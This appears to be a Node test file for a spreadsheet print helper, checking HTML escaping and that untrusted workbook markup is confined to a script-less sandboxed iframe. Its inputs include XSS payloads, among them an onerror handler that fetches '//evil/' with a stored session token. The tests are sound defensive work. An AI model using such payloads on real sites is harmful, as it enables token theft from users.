// node client/src/lib/printDoc.test.mjs
import assert from "node:assert";
import { escapeHtml, spreadsheetPrintDoc } from "./printDoc.js";

let pass = 0;
const ok = (c, m) => { assert.ok(c, m); pass++; };

// escapeHtml neutralises the five markup characters.
ok(escapeHtml(`a"><script>x</script>`) === "a&quot;&gt;&lt;script&gt;x&lt;/script&gt;", "escapeHtml escapes < > \" etc.");

// A hostile file name cannot break out of <title>.
const doc1 = spreadsheetPrintDoc({ title: `Leave</title><script>steal()</script>.xlsx`, tableHtml: "<table></table>" });
ok(!/<title>[^<]*<\/title>\s*<script/i.test(doc1), "the title cannot be closed early to start a script");
ok(doc1.includes("&lt;script&gt;steal()"), "the file name's script is escaped in the title");

// Untrusted workbook HTML lands inside a sandboxed iframe's srcdoc, escaped as
// an attribute — so it is never live markup in the print window itself.
const hostile = `<td data-v="x"><img src=x onerror="fetch('//evil/'+localStorage.sf_token)"></td>`;
const doc2 = spreadsheetPrintDoc({ title: "Report", tableHtml: hostile });
ok(/<iframe sandbox srcdoc="/.test(doc2), "the workbook is wrapped in a sandboxed iframe");
ok(!doc2.includes(`onerror="fetch`), "the onerror handler is not present as live markup");
ok(doc2.includes("onerror=&quot;fetch"), "…it survives only as an escaped attribute value inside srcdoc");
ok(doc2.includes("default-src &#39;none&#39;"), "the iframe document carries a strict CSP (escaped inside srcdoc)");
// The sandbox has no allow-scripts token.
ok(/<iframe sandbox(\s|>)/.test(doc2) && !/allow-scripts/.test(doc2), "the sandbox grants no script permission");

console.log(`  ${pass} passed`);
